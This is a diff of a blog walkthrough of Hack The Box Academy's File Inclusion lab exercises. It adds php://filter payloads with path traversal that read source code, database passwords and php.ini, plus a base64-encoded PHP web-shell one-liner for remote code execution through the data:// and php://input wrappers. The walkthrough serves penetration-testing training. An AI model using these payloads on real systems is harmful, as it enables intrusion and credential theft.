@@ -2,7 +2,7 @@
 layout: post
 title:  "Hack The Box - Academy - File Inclusion"
 description: "Explore this detailed walkthrough of Hack The Box Academy's File Inclusion module. Learn effective techniques to perform Local file inclusion (LFI), Remote File Inclusion (RFI) and elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
-date:   2024-11-24 07:25
+date:   2024-11-27 21:05
 image:  /images/htb/file-inclusion/logo.png
 tags:   [lfi,rfi,cbbh]
 categories: [htbacademy]
@@ -62,3 +62,52 @@ Apply a `Length Filter`: Look through the responses for any with a length of `38
 
 ## PHP Filters - Exercise
 > Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer
+
+We'll use the `directory-list-2.3-small.txt` wordlist from the SecLists to perform web content discovery.
+
+```
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+```
+![Ffuf - Content Discovery](/images/htb/file-inclusion/php-filters-ffuf-result.png)
+
+After identifying the PHP file, we'll use the php://filter stream wrapper to encode the file's content in Base64 format. Replace {PHP_PAGE} with the name of the discovered PHP file:
+
+```
+php://filter/read=convert.base64-encode/resource={PHP_PAGE}
+```
+
+![PHP Filter Extract Source Code](/images/htb/file-inclusion/php-filters-base64-result.png)
+
+We'll use Caido's built in Base-64 decode tool to decode the payload and read the database password.
+
+![Extract database password](/images/htb/file-inclusion/php-filter-result.png)
+
+## PHP Wrappers - Exercise
+
+> Try to gain RCE using one of the PHP wrappers and read the flag at /
+
+We'll read the php.ini file to check if `allow_url_include` is enable for us to use the [php data wrapper](https://www.php.net/manual/en/wrappers.data.php)
+
+We'll use the below payload to read the `php.ini` file:
+
+```
+php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/apache2/php.ini"
+```
+
+For `Nginx`:
+
+```
+php://filter/read=convert.base64-encode/resource=../../../..//etc/php/X.Y/fpm/php.ini"
+```
+
+Different php wrappers to use:
+
+```
+echo '<?php system($_GET["cmd"]); ?>' | base64
+```
+
+- data:// (GET)
+![Data php warpper](/images/htb/file-inclusion/php-wrappers-data.png)
+- php://input (POST)
+![Input php warpper](/images/htb/file-inclusion/php-wrappers-input.png)
+- expect:// (GET)
